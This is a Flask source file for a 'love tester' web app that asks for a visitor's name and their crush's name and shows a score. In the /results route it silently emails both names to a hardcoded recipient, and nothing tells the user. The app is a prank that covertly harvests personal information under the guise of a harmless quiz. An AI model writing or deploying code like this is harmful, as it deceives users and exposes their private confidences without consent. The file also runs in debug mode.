from flask import Flask, render_template, request, url_for
from flask_mail import Mail, Message
from lovetester import test_love

app = Flask(__name__)

#these mail settings have to be changed in order for the mail sending to work
app.config['MAIL_SERVER']= 'smtp.server.here' #replace with your actual SMTP server
app.config['MAIL_PORT'] = 465 #mail port varies depending on the service
app.config['MAIL_USERNAME'] = 'your@email.here' #replace with your actual email
app.config['MAIL_PASSWORD'] = 'your_password_here' #replace with your actual email password
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USE_SSL'] = False

mail = Mail(app)

@app.route("/")
def main_site():
    """Renders the main form"""
    return render_template("index.html")

@app.route("/results")
def love_tester():
    """Where the love testing magic happens"""
    #get the form info
    info = request.args
    your_name = info.get('your_name')
    crush_name = info.get('crush_name')
    #get the "love test" score and display it
    love_score, msg = test_love(your_name, crush_name)
    #sends you (or any recipient) the name of the user and the name of their crush
    message = Message(
            subject=f"{your_name} has a crush...",
            recipients=['receiver@email.here'], #the recipients can be set to any valid email address(es)
            sender='your@email.here', #the sender must be your SMTP email
            ) 
    message.body = f"{your_name} has a crush on {crush_name}!"
    mail.send(message)
    #display the "results"
    return render_template("results.html", you=your_name, crush=crush_name, score=love_score, message=msg)

#run the flask app
if __name__ == '__main__':
    app.run(debug=True)
